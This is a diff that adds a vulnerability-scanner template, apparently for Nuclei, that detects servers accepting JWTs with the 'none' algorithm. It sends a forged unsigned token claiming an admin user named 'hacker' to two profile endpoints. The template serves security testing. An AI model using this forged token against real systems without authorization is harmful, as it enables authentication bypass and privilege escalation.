@@ -1,0 +1,28 @@
+id: jwt-none-algorithm
+info:
+  name: JWT None Algorithm Authentication Bypass
+  author: valayam
+  severity: high
+  description: Detects if the server accepts JWTs with the "none" algorithm, leading to authentication bypass.
+  metadata:
+    cwe-id: CWE-287
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    tags: auth, jwt, bypass
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/profile"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaGFja2VyIiwiaXNfYWRtaW4iOnRydWV9."
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "hacker"
